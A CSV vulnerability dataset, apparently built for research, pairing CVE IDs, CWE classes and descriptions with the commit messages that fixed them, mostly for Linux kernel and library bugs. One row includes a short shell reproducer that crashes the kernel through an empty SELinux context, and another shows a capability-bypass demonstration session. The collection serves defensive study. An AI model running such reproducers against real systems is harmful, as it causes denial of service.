CVE-2018-13304,CWE-617,2018-07-05,"In libavcodec in FFmpeg 4.0.1, improper maintenance of the consistency between the context profile field and studio_profile in libavcodec may trigger an assertion failure while converting a crafted AVI file to MPEG4, leading to a denial of service, related to error_resilience.c, h263dec.c, and mpeg4videodec.c.","The profile field is changed by code inside and outside the decoder, its not a reliable indicator of the internal codec state. Maintaining it consistency with studio_profile is messy. Its easier to just avoid it and use only studio_profile  Fixes: assertion failure Fixes: ffmpeg_crash_9.avi  Found-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2015-2686,CWE-264,2016-05-02,"net/socket.c in the Linux kernel 3.19 before 3.19.3 does not validate certain range data for (1) sendto and (2) recvfrom system calls, which allows local users to gain privileges by leveraging a subsystem that uses the copy_from_iter function in the iov_iter interface, as demonstrated by the Bluetooth subsystem.",Cc: stable@vger.kernel.org # v3.19 Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2019-3817,CWE-416,2019-03-27,"A use-after-free flaw has been discovered in libcomps before version 0.1.10 in the way ObjMRTrees are merged. An attacker, who is able to make an application read a crafted comps XML file, may be able to crash the application or execute malicious code.",The added field is not used at all in many places and it is probably the left-over of some copy-paste.
CVE-2016-9888,CWE-476,2016-12-08,"An error within the ""tar_directory_for_file()"" function (gsf-infile-tar.c) in GNOME Structured File Library before 1.14.41 can be exploited to trigger a Null pointer dereference and subsequently cause a crash via a crafted TAR file.",
CVE-2015-9289,CWE-125,2019-07-27,"In the Linux kernel before 4.1.4, a buffer overflow occurs when checking userspace params in drivers/media/dvb-frontends/cx24116.c. The maximum size for a DiSEqC command is 6, according to the userspace API. However, the code allows larger values such as 23.","The maximum size for a DiSEqC command is 6, according to the userspace API. However, the code allows to write up much more values: 	drivers/media/dvb-frontends/cx24116.c:983 cx24116_send_diseqc_msg() error: buffer overflow 'd->msg' 6 <= 23  Cc: stable@vger.kernel.org Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>"
CVE-2016-7976,CWE-20,2017-08-07,The PS Interpreter in Ghostscript 9.18 and 9.20 allows remote attackers to execute arbitrary code via crafted userparams.,
CVE-2011-4128,CWE-119,2011-12-08,"Buffer overflow in the gnutls_session_get_data function in lib/gnutls_session.c in GnuTLS 2.12.x before 2.12.14 and 3.x before 3.0.7, when used on a client that performs nonstandard session resumption, allows remote TLS servers to cause a denial of service (application crash) via a large SessionTicket.",
CVE-2013-4125,CWE-399,2013-07-15,"The fib6_add_rt2node function in net/ipv6/ip6_fib.c in the IPv6 stack in the Linux kernel through 3.10.1 does not properly handle Router Advertisement (RA) messages in certain circumstances involving three routes that initially qualified for membership in an ECMP route set until a change occurred for one of the first two routes, which allows remote attackers to cause a denial of service (system crash) via a crafted sequence of messages.","Static routes in this case are non-expiring routes which did not get configured by autoconf or by icmpv6 redirects.  To make sure we actually get an ecmp route while searching for the first one in this fib6_node's leafs, also make sure it matches the ecmp route assumptions.  v2: a) Removed RTF_EXPIRE check in dst.from chain. The check of RTF_ADDRCONF    already ensures that this route, even if added again without    RTF_EXPIRES (in case of a RA announcement with infinite timeout),    does not cause the rt6i_nsiblings logic to go wrong if a later RA    updates the expiration time later.  v3: a) Allow RTF_EXPIRES routes to enter the ecmp route set. We have to do so,    because an pmtu event could update the RTF_EXPIRES flag and we would    not count this route, if another route joins this set. We now filter    only for RTF_GATEWAY|RTF_ADDRCONF|RTF_DYNAMIC, which are flags that    don't get changed after rt6_info construction.  Cc: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10146,CWE-399,2017-03-24,Multiple memory leaks in the caption and label handling code in ImageMagick allow remote attackers to cause a denial of service (memory consumption) via unspecified vectors.,
CVE-2017-10911,CWE-200,2017-07-05,"The make_response function in drivers/block/xen-blkback/blkback.c in the Linux kernel before 4.11.8 allows guest OS users to obtain sensitive information from host OS (or other guest OS) kernel memory by leveraging the copying of uninitialized padding fields in Xen block-interface response structures, aka XSA-216.","Rather than constructing a local structure instance on the stack, fill the fields directly on the shared ring, just like other backends do. Build on the fact that all response structure flavors are actually identical (the old code did make this assumption too).  This is XSA-216.  Cc: stable@vger.kernel.org  Signed-off-by: Jan Beulich <jbeulich@suse.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>"
CVE-2018-10940,CWE-119,2018-05-09,The cdrom_ioctl_media_changed function in drivers/cdrom/cdrom.c in the Linux kernel before 4.16.6 allows local attackers to use a incorrect bounds check in the CDROM driver CDROM_MEDIA_CHANGED ioctl to read out kernel memory.,"This cast is wrong.  ""cdi->capacity"" is an int and ""arg"" is an unsigned long.  The way the check is written now, if one of the high 32 bits is set then we could read outside the info->slots[] array.  This bug is pretty old and it predates git.  Reviewed-by: Christoph Hellwig <hch@lst.de> Cc: stable@vger.kernel.org Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2017-13009,CWE-125,2017-09-14,The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_print().,"This fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.  Add a test using the capture file supplied by the reporter(s).  While we're at it:  Add a comment giving the RFC for IPv6 mobility headers.  Clean up some bounds checks to make it clearer what they're checking, by matching the subsequent EXTRACT_ calls or memcpy.  For the binding update, if none of the flag bits are set, don't check the individual flag bits."
CVE-2011-1019,,2013-03-01,The dev_load function in net/core/dev.c in the Linux kernel before 2.6.38 allows local users to bypass an intended CAP_SYS_MODULE capability requirement and load arbitrary modules by leveraging the CAP_NET_ADMIN capability.,"Since a8f80e8 any process with CAP_NET_ADMIN may load any module from /lib/modules/.  This doesn't mean that CAP_NET_ADMIN is a superset of CAP_SYS_MODULE as modules are limited to /lib/modules/**.  However, CAP_NET_ADMIN capability shouldn't allow anybody load any module not related to networking.  This patch restricts an ability of autoloading modules to netdev modules with explicit aliases.  This fixes CVE-2011-1019.  Arnd Bergmann suggested to leave untouched the old pre-v2.6.32 behavior of loading netdev modules by name (without any prefix) for processes with CAP_SYS_MODULE to maintain the compatibility with network scripts that use autoloading netdev modules by aliases like ""eth0"", ""wlan0"".  Currently there are only three users of the feature in the upstream kernel: ipip, ip_gre and sit.      root@albatros:~# capsh --drop=$(seq -s, 0 11),$(seq -s, 13 34) --     root@albatros:~# grep Cap /proc/$$/status     CapInh:	0000000000000000     CapPrm:	fffffff800001000     CapEff:	fffffff800001000     CapBnd:	fffffff800001000     root@albatros:~# modprobe xfs     FATAL: Error inserting xfs     (/lib/modules/2.6.38-rc6-00001-g2bf4ca3/kernel/fs/xfs/xfs.ko): Operation not permitted     root@albatros:~# lsmod | grep xfs     root@albatros:~# ifconfig xfs     xfs: error fetching interface information: Device not found     root@albatros:~# lsmod | grep xfs     root@albatros:~# lsmod | grep sit     root@albatros:~# ifconfig sit     sit: error fetching interface information: Device not found     root@albatros:~# lsmod | grep sit     root@albatros:~# ifconfig sit0     sit0      Link encap:IPv6-in-IPv4 	      NOARP  MTU:1480  Metric:1      root@albatros:~# lsmod | grep sit     sit                    10457  0     tunnel4                 2957  1 sit  For CAP_SYS_MODULE module loading is still relaxed:      root@albatros:~# grep Cap /proc/$$/status     CapInh:	0000000000000000     CapPrm:	ffffffffffffffff     CapEff:	ffffffffffffffff     CapBnd:	ffffffffffffffff     root@albatros:~# ifconfig xfs     xfs: error fetching interface information: Device not found     root@albatros:~# lsmod | grep xfs     xfs                   745319  0  Reference: https://lkml.org/lkml/2011/2/24/203  Signed-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Michael Tokarev <mjt@tls.msk.ru> Acked-by: David S. Miller <davem@davemloft.net> Acked-by: Kees Cook <kees.cook@canonical.com> Signed-off-by: James Morris <jmorris@namei.org>"
CVE-2017-17862,CWE-20,2017-12-27,"kernel/bpf/verifier.c in the Linux kernel through 4.14.8 ignores unreachable code, even though it would still be processed by JIT compilers. This behavior, also considered an improper branch-pruning logic issue, could possibly be used by local users for denial of service.","when the verifier detects that register contains a runtime constant and it's compared with another constant it will prune exploration of the branch that is guaranteed not to be taken at runtime. This is all correct, but malicious program may be constructed in such a way that it always has a constant comparison and the other branch is never taken under any conditions. In this case such path through the program will not be explored by the verifier. It won't be taken at run-time either, but since all instructions are JITed the malicious program may cause JITs to complain about using reserved fields, etc. To fix the issue we have to track the instructions explored by the verifier and sanitize instructions that are dead at run time with NOPs. We cannot reject such dead code, since llvm generates it for valid C code, since it doesn't do as much data flow analysis as the verifier does.  Fixes: 17a5267 (""bpf: verifier (add verifier core)"") Signed-off-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2014-1874,CWE-20,2014-02-28,The security_context_to_sid_core function in security/selinux/ss/services.c in the Linux kernel before 3.13.4 allows local users to cause a denial of service (system crash) by leveraging the CAP_MAC_ADMIN capability to set a zero-length security context.,"Setting an empty security context (length=0) on a file will lead to incorrectly dereferencing the type and other fields of the security context structure, yielding a kernel BUG. As a zero-length security context is never valid, just reject all such security contexts whether coming from userspace via setxattr or coming from the filesystem upon a getxattr request by SELinux.  Setting a security context value (empty or otherwise) unknown to SELinux in the first place is only possible for a root process (CAP_MAC_ADMIN), and, if running SELinux in enforcing mode, only if the corresponding SELinux mac_admin permission is also granted to the domain by policy.  In Fedora policies, this is only allowed for specific domains such as livecd for setting down security contexts that are not defined in the build host policy.  Reproducer: su setenforce 0 touch foo setfattr -n security.selinux foo  Caveat: Relabeling or removing foo after doing the above may not be possible without booting with SELinux disabled.  Any subsequent access to foo after doing the above will also trigger the BUG.  BUG output from Matthew Thode: [  473.893141] ------------[ cut here ]------------ [  473.962110] kernel BUG at security/selinux/ss/services.c:654! [  473.995314] invalid opcode: 0000 [#6] SMP [  474.027196] Modules linked in: [  474.058118] CPU: 0 PID: 8138 Comm: ls Tainted: G      D   I 3.13.0-grsec #1 [  474.116637] Hardware name: Supermicro X8ST3/X8ST3, BIOS 2.0 07/29/10 [  474.149768] task: ffff8805f50cd010 ti: ffff8805f50cd488 task.ti: ffff8805f50cd488 [  474.183707] RIP: 0010:[<ffffffff814681c7>]  [<ffffffff814681c7>] context_struct_compute_av+0xce/0x308 [  474.219954] RSP: 0018:ffff8805c0ac3c38  EFLAGS: 00010246 [  474.252253] RAX: 0000000000000000 RBX: ffff8805c0ac3d94 RCX: 0000000000000100 [  474.287018] RDX: ffff8805e8aac000 RSI: 00000000ffffffff RDI: ffff8805e8aaa000 [  474.321199] RBP: ffff8805c0ac3cb8 R08: 0000000000000010 R09: 0000000000000006 [  474.357446] R10: 0000000000000000 R11: ffff8805c567a000 R12: 0000000000000006 [  474.419191] R13: ffff8805c2b74e88 R14: 00000000000001da R15: 0000000000000000 [  474.453816] FS:  00007f2e75220800(0000) GS:ffff88061fc00000(0000) knlGS:0000000000000000 [  474.489254] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  474.522215] CR2: 00007f2e74716090 CR3: 00000005c085e000 CR4: 00000000000207f0 [  474.556058] Stack: [  474.584325]  ffff8805c0ac3c98 ffffffff811b549b ffff8805c0ac3c98 ffff8805f1190a40 [  474.618913]  ffff8805a6202f08 ffff8805c2b74e88 00068800d0464990 ffff8805e8aac860 [  474.653955]  ffff8805c0ac3cb8 000700068113833a ffff880606c75060 ffff8805c0ac3d94 [  474.690461] Call Trace: [  474.723779]  [<ffffffff811b549b>] ? lookup_fast+0x1cd/0x22a [  474.778049]  [<ffffffff81468824>] security_compute_av+0xf4/0x20b [  474.811398]  [<ffffffff8196f419>] avc_compute_av+0x2a/0x179 [  474.843813]  [<ffffffff8145727b>] avc_has_perm+0x45/0xf4 [  474.875694]  [<ffffffff81457d0e>] inode_has_perm+0x2a/0x31 [  474.907370]  [<ffffffff81457e76>] selinux_inode_getattr+0x3c/0x3e [  474.938726]  [<ffffffff81455cf6>] security_inode_getattr+0x1b/0x22 [  474.970036]  [<ffffffff811b057d>] vfs_getattr+0x19/0x2d [  475.000618]  [<ffffffff811b05e5>] vfs_fstatat+0x54/0x91 [  475.030402]  [<ffffffff811b063b>] vfs_lstat+0x19/0x1b [  475.061097]  [<ffffffff811b077e>] SyS_newlstat+0x15/0x30 [  475.094595]  [<ffffffff8113c5c1>] ? __audit_syscall_entry+0xa1/0xc3 [  475.148405]  [<ffffffff8197791e>] system_call_fastpath+0x16/0x1b [  475.179201] Code: 00 48 85 c0 48 89 45 b8 75 02 0f 0b 48 8b 45 a0 48 8b 3d 45 d0 b6 00 8b 40 08 89 c6 ff ce e8 d1 b0 06 00 48 85 c0 49 89 c7 75 02 <0f> 0b 48 8b 45 b8 4c 8b 28 eb 1e 49 8d 7d 08 be 80 01 00 00 e8 [  475.255884] RIP  [<ffffffff814681c7>] context_struct_compute_av+0xce/0x308 [  475.296120]  RSP <ffff8805c0ac3c38> [  475.328734] ---[ end trace f076482e9d754adc ]---  Reported-by:  Matthew Thode <mthode@mthode.org> Signed-off-by: Stephen Smalley <sds@tycho.nsa.gov> Cc: stable@vger.kernel.org Signed-off-by: Paul Moore <pmoore@redhat.com>"
CVE-2017-12992,CWE-125,2017-09-14,The RIPng parser in tcpdump before 4.9.2 has a buffer over-read in print-ripng.c:ripng_print().,"Do bounds checking as we access items.  Scan the list of netinfo6 entries based on the supplied packet length, without taking the captured length into account; let the aforementioned bounds checking handle that.  This fixes a buffer over-read discovered by Kamil Frankowicz.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-2385,CWE-119,2016-04-11,Heap-based buffer overflow in the encode_msg function in encode_msg.c in the SEAS module in Kamailio (formerly OpenSER and SER) before 4.3.5 allows remote attackers to cause a denial of service (memory corruption and process crash) or possibly execute arbitrary code via a large SIP packet.,
CVE-2019-11463,CWE-401,2019-04-23,A memory leak in archive_read_format_zip_cleanup in archive_read_support_format_zip.c in libarchive 3.3.4-dev allows remote attackers to cause a denial of service via a crafted ZIP file because of a HAVE_LZMA_H typo. NOTE: this only affects users who downloaded the development code from GitHub. Users of the product's official releases are unaffected.,Frees lzma_stream on cleanup()  Fixes #1165
CVE-2018-20542,CWE-119,2018-12-28,"There is a heap-based buffer-overflow at generator_spgemm_csc_reader.c (function libxsmm_sparse_csc_reader) in LIBXSMM 1.10, a different vulnerability than CVE-2018-20541 (which is in a different part of the source code and is seen at a different address).",
CVE-2012-0037,CWE-200,2012-06-17,"Redland Raptor (aka libraptor) before 2.0.7, as used by OpenOffice 3.3 and 3.4 Beta, LibreOffice before 3.4.6 and 3.5.x before 3.5.1, and other products, allows user-assisted remote attackers to read arbitrary files via a crafted XML external entity (XXE) declaration and reference in an RDF document.","Enforce entity loading policy in raptor_libxml_resolveEntity and raptor_libxml_getEntity by checking for file URIs and network URIs.  Add RAPTOR_OPTION_LOAD_EXTERNAL_ENTITIES / loadExternalEntities for turning on loading of XML external entity loading, disabled by default.  This affects all the parsers that use SAX2: rdfxml, rss-tag-soup (and aliases) and rdfa."
CVE-2017-5550,CWE-200,2017-02-06,Off-by-one error in the pipe_advance function in lib/iov_iter.c in the Linux kernel before 4.9.5 allows local users to obtain sensitive information from uninitialized heap-memory locations in opportunistic circumstances by reading from a pipe after an incorrect buffer-release decision.,"The logics in pipe_advance() used to release all buffers past the new position failed in cases when the number of buffers to release was equal to pipe->buffers.  If that happened, none of them had been released, leaving pipe full.  Worse, it was trivial to trigger and we end up with pipe full of uninitialized pages.  IOW, it's an infoleak.  Cc: stable@vger.kernel.org # v4.9 Reported-by: ""Alan J. Wylie"" <alan@wylie.me.uk> Tested-by: ""Alan J. Wylie"" <alan@wylie.me.uk> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2017-16546,CWE-119,2017-11-05,"The ReadWPGImage function in coders/wpg.c in ImageMagick 7.0.7-9 does not properly validate the colormap index in a WPG palette, which allows remote attackers to cause a denial of service (use of uninitialized data or invalid memory allocation) or possibly have unspecified other impact via a malformed WPG file.",
CVE-2016-9555,CWE-125,2016-11-28,"The sctp_sf_ootb function in net/sctp/sm_statefuns.c in the Linux kernel before 4.8.8 lacks chunk-length checking for the first chunk, which allows remote attackers to cause a denial of service (out-of-bounds slab access) or possibly have unspecified other impact via crafted SCTP data.","Andrey Konovalov reported that KASAN detected that SCTP was using a slab beyond the boundaries. It was caused because when handling out of the blue packets in function sctp_sf_ootb() it was checking the chunk len only after already processing the first chunk, validating only for the 2nd and subsequent ones.  The fix is to just move the check upwards so it's also validated for the 1st chunk.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Reviewed-by: Xin Long <lucien.xin@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-3315,CWE-59,2017-06-26,"Automatic Bug Reporting Tool (ABRT) allows local users to read, change the ownership of, or have other unspecified impact on arbitrary files via a symlink attack on (1) /var/tmp/abrt/*/maps, (2) /tmp/jvm-*/hs_error.log, (3) /proc/*/exe, (4) /etc/os-release in a chroot, or (5) an unspecified root directory related to librpm.",Users are allowed to modify /proc/[pid]/root to any directory by running their own MOUNT namespace.  Related: #1211835  Signed-off-by: Jakub Filak <jfilak@redhat.com>
CVE-2017-16643,CWE-125,2017-11-07,The parse_hid_report_descriptor function in drivers/input/tablet/gtco.c in the Linux kernel before 4.13.11 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.,"parse_hid_report_descriptor() has a while (i < length) loop, which only guarantees that there's at least 1 byte in the buffer, but the loop body can read multiple bytes which causes out-of-bounds access.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Reviewed-by: Andrey Konovalov <andreyknvl@google.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2016-7127,CWE-787,2016-09-12,"The imagegammacorrect function in ext/gd/gd.c in PHP before 5.6.25 and 7.x before 7.0.10 does not properly validate gamma values, which allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact by providing different signs for the second and third arguments.",
CVE-2019-1563,CWE-203,2019-09-10,"In situations where an attacker receives automated notification of the success or failure of a decryption attempt an attacker, after sending a very large number of messages to be decrypted, can recover a CMS/PKCS7 transported encryption key or decrypt any RSA encrypted message that was encrypted with the public RSA key, using a Bleichenbacher padding oracle attack. Applications are not affected if they use a certificate together with the private RSA key to the CMS_decrypt or PKCS7_decrypt functions to select the correct recipient info to decrypt. Fixed in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c). Fixed in OpenSSL 1.1.0l (Affected 1.1.0-1.1.0k). Fixed in OpenSSL 1.0.2t (Affected 1.0.2-1.0.2s).",
CVE-2018-11598,CWE-125,2018-05-31,Espruino before 1.99 allows attackers to cause a denial of service (application crash) and a potential Information Disclosure with user crafted input files via a Buffer Overflow or Out-of-bounds Read during syntax parsing of certain for loops in jsparse.c.,
CVE-2018-20856,CWE-416,2019-07-26,"An issue was discovered in the Linux kernel before 4.18.7. In block/blk-core.c, there is an __blk_drain_queue() use-after-free because a certain error case is mishandled.","We find the memory use-after-free issue in __blk_drain_queue() on the kernel 4.14. After read the latest kernel 4.18-rc6 we think it has the same problem.  Memory is allocated for q->fq in the blk_init_allocated_queue(). If the elevator init function called with error return, it will run into the fail case to free the q->fq.  Then the __blk_drain_queue() uses the same memory after the free of the q->fq, it will lead to the unpredictable event.  The patch is to set q->fq as NULL in the fail case of blk_init_allocated_queue().  Fixes: commit 7c94e1c (""block: introduce blk_flush_queue to drive flush machinery"") Cc: <stable@vger.kernel.org> Reviewed-by: Ming Lei <ming.lei@redhat.com> Reviewed-by: Bart Van Assche <bart.vanassche@wdc.com> Signed-off-by: xiao jin <jin.xiao@intel.com> Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2016-3955,CWE-119,2016-07-03,The usbip_recv_xbuff function in drivers/usb/usbip/usbip_common.c in the Linux kernel before 4.5.3 allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted length value in a USB/IP packet.,"Fix potential out-of-bounds write to urb->transfer_buffer usbip handles network communication directly in the kernel. When receiving a packet from its peer, usbip code parses headers according to protocol. As part of this parsing urb->actual_length is filled. Since the input for urb->actual_length comes from the network, it should be treated as untrusted. Any entity controlling the network may put any value in the input and the preallocated urb->transfer_buffer may not be large enough to hold the data. Thus, the malicious entity is able to write arbitrary data to kernel memory.  Signed-off-by: Ignat Korchagin <ignat.korchagin@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2012-1179,CWE-264,2012-05-17,"The Linux kernel before 3.3.1, when KVM is used, allows guest OS users to cause a denial of service (host OS crash) by leveraging administrative access to the guest OS, related to the pmd_none_or_clear_bad function and page faults for huge pages.","commit 1a5a990 upstream.  In some cases it may happen that pmd_none_or_clear_bad() is called with the mmap_sem hold in read mode.  In those cases the huge page faults can allocate hugepmds under pmd_none_or_clear_bad() and that can trigger a false positive from pmd_bad() that will not like to see a pmd materializing as trans huge.  It's not khugepaged causing the problem, khugepaged holds the mmap_sem in write mode (and all those sites must hold the mmap_sem in read mode to prevent pagetables to go away from under them, during code review it seems vm86 mode on 32bit kernels requires that too unless it's restricted to 1 thread per process or UP builds).  The race is only with the huge pagefaults that can convert a pmd_none() into a pmd_trans_huge().  Effectively all these pmd_none_or_clear_bad() sites running with mmap_sem in read mode are somewhat speculative with the page faults, and the result is always undefined when they run simultaneously.  This is probably why it wasn't common to run into this.  For example if the madvise(MADV_DONTNEED) runs zap_page_range() shortly before the page fault, the hugepage will not be zapped, if the page fault runs first it will be zapped.  Altering pmd_bad() not to error out if it finds hugepmds won't be enough to fix this, because zap_pmd_range would then proceed to call zap_pte_range (which would be incorrect if the pmd become a pmd_trans_huge()).  The simplest way to fix this is to read the pmd in the local stack (regardless of what we read, no need of actual CPU barriers, only compiler barrier needed), and be sure it is not changing under the code that computes its value.  Even if the real pmd is changing under the value we hold on the stack, we don't care.  If we actually end up in zap_pte_range it means the pmd was not none already and it was not huge, and it can't become huge from under us (khugepaged locking explained above).  All we need is to enforce that there is no way anymore that in a code path like below, pmd_trans_huge can be false, but pmd_none_or_clear_bad can run into a hugepmd.  The overhead of a barrier() is just a compiler tweak and should not be measurable (I only added it for THP builds).  I don't exclude different compiler versions may have prevented the race too by caching the value of *pmd on the stack (that hasn't been verified, but it wouldn't be impossible considering pmd_none_or_clear_bad, pmd_bad, pmd_trans_huge, pmd_none are all inlines and there's no external function called in between pmd_trans_huge and pmd_none_or_clear_bad).  		if (pmd_trans_huge(*pmd)) { 			if (next-addr != HPAGE_PMD_SIZE) { 				VM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem)); 				split_huge_page_pmd(vma->vm_mm, pmd); 			} else if (zap_huge_pmd(tlb, vma, pmd, addr)) 				continue; 			/* fall through */ 		} 		if (pmd_none_or_clear_bad(pmd))  Because this race condition could be exercised without special privileges this was reported in CVE-2012-1179.  The race was identified and fully explained by Ulrich who debugged it. I'm quoting his accurate explanation below, for reference.  ====== start quote =======       mapcount 0 page_mapcount 1       kernel BUG at mm/huge_memory.c:1384!      At some point prior to the panic, a ""bad pmd ..."" message similar to the     following is logged on the console:        mm/memory.c:145: bad pmd ffff8800376e1f98(80000000314000e7).      The ""bad pmd ..."" message is logged by pmd_clear_bad() before it clears     the page's PMD table entry.          143 void pmd_clear_bad(pmd_t *pmd)         144 {     ->  145         pmd_ERROR(*pmd);         146         pmd_clear(pmd);         147 }      After the PMD table entry has been cleared, there is an inconsistency     between the actual number of PMD table entries that are mapping the page     and the page's map count (_mapcount field in struct page). When the page     is subsequently reclaimed, __split_huge_page() detects this inconsistency.         1381         if (mapcount != page_mapcount(page))        1382                 printk(KERN_ERR ""mapcount %d page_mapcount %d\n"",        1383                        mapcount, page_mapcount(page));     -> 1384         BUG_ON(mapcount != page_mapcount(page));      The root cause of the problem is a race of two threads in a multithreaded     process. Thread B incurs a page fault on a virtual address that has never     been accessed (PMD entry is zero) while Thread A is executing an madvise()     system call on a virtual address within the same 2 MB (huge page) range.                 virtual address space               .---------------------.               |                     |               |                     |             .-|---------------------|             | |                     |             | |                     |<-- B(fault)             | |                     |       2 MB  | |/////////////////////|-.       huge <  |/////////////////////|  > A(range)       page  | |/////////////////////|-'             | |                     |             | |                     |             '-|---------------------|               |                     |               |                     |               '---------------------'      - Thread A is executing an madvise(..., MADV_DONTNEED) system call       on the virtual address range ""A(range)"" shown in the picture.      sys_madvise       // Acquire the semaphore in shared mode.       down_read(&current->mm->mmap_sem)       ...       madvise_vma         switch (behavior)         case MADV_DONTNEED:              madvise_dontneed                zap_page_range                  unmap_vmas                    unmap_page_range                      zap_pud_range                        zap_pmd_range                          //                          // Assume that this huge page has never been accessed.                          // I.e. content of the PMD entry is zero (not mapped).                          //                          if (pmd_trans_huge(*pmd)) {                              // We don't get here due to the above assumption.                          }                          //                          // Assume that Thread B incurred a page fault and              .---------> // sneaks in here as shown below.              |           //              |           if (pmd_none_or_clear_bad(pmd))              |               {              |                 if (unlikely(pmd_bad(*pmd)))              |                     pmd_clear_bad              |                     {              |                       pmd_ERROR              |                         // Log ""bad pmd ..."" message here.              |                       pmd_clear              |                         // Clear the page's PMD entry.              |                         // Thread B incremented the map count              |                         // in page_add_new_anon_rmap(), but              |                         // now the page is no longer mapped              |                         // by a PMD entry (-> inconsistency).              |                     }              |               }              |              v     - Thread B is handling a page fault on virtual address ""B(fault)"" shown       in the picture.      ...     do_page_fault       __do_page_fault         // Acquire the semaphore in shared mode.         down_read_trylock(&mm->mmap_sem)         ...         handle_mm_fault           if (pmd_none(*pmd) && transparent_hugepage_enabled(vma))               // We get here due to the above assumption (PMD entry is zero).               do_huge_pmd_anonymous_page                 alloc_hugepage_vma                   // Allocate a new transparent huge page here.                 ...                 __do_huge_pmd_anonymous_page                   ...                   spin_lock(&mm->page_table_lock)                   ...                   page_add_new_anon_rmap                     // Here we increment the page's map count (starts at -1).                     atomic_set(&page->_mapcount, 0)                   set_pmd_at                     // Here we set the page's PMD entry which will be cleared                     // when Thread A calls pmd_clear_bad().                   ...                   spin_unlock(&mm->page_table_lock)      The mmap_sem does not prevent the race because both threads are acquiring     it in shared mode (down_read).  Thread B holds the page_table_lock while     the page's map count and PMD table entry are updated.  However, Thread A     does not synchronize on that lock.  ====== end quote =======  [akpm@linux-foundation.org: checkpatch fixes] Reported-by: Ulrich Obergfell <uobergfe@redhat.com> Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Acked-by: Johannes Weiner <hannes@cmpxchg.org> Cc: Mel Gorman <mgorman@suse.de> Cc: Hugh Dickins <hughd@google.com> Cc: Dave Jones <davej@redhat.com> Acked-by: Larry Woodman <lwoodman@redhat.com> Acked-by: Rik van Riel <riel@redhat.com> Cc: Mark Salter <msalter@redhat.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2012-2384,CWE-189,2012-06-13,Integer overflow in the i915_gem_do_execbuffer function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.,"On 32-bit systems, a large args->num_cliprects from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.  This vulnerability was introduced in commit 432e58e (""drm/i915: Avoid allocation for execbuffer object list"").  Signed-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk> Cc: stable@vger.kernel.org Signed-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>"
CVE-2011-4347,CWE-264,2013-06-08,"The kvm_vm_ioctl_assign_device function in virt/kvm/assigned-dev.c in the KVM subsystem in the Linux kernel before 3.1.10 does not verify permission to access PCI configuration space and BAR resources, which allows host OS users to assign PCI devices and cause a denial of service (host OS crash) via a KVM_ASSIGN_PCI_DEVICE operation.","(cherry picked from commit 3d27e23)  Only allow KVM device assignment to attach to devices which:   - Are not bridges  - Have BAR resources (assume others are special devices)  - The user has permissions to use  Assigning a bridge is a configuration error, it's not supported, and typically doesn't result in the behavior the user is expecting anyway. Devices without BAR resources are typically chipset components that also don't have host drivers.  We don't want users to hold such devices captive or cause system problems by fencing them off into an iommu domain.  We determine ""permission to use"" by testing whether the user has access to the PCI sysfs resource files.  By default a normal user will not have access to these files, so it provides a good indication that an administration agent has granted the user access to the device.  [Yang Bai: add missing #include] [avi: fix comment style]  Signed-off-by: Alex Williamson <alex.williamson@redhat.com> Signed-off-by: Yang Bai <hamo.by@gmail.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>"
CVE-2016-0701,CWE-200,2016-02-15,"The DH_check_pub_key function in crypto/dh/dh_check.c in OpenSSL 1.0.2 before 1.0.2f does not ensure that prime numbers are appropriate for Diffie-Hellman (DH) key exchange, which makes it easier for remote attackers to discover a private DH exponent by making multiple handshakes with a peer that chose an inappropriate number, as demonstrated by a number in an X9.42 file.",
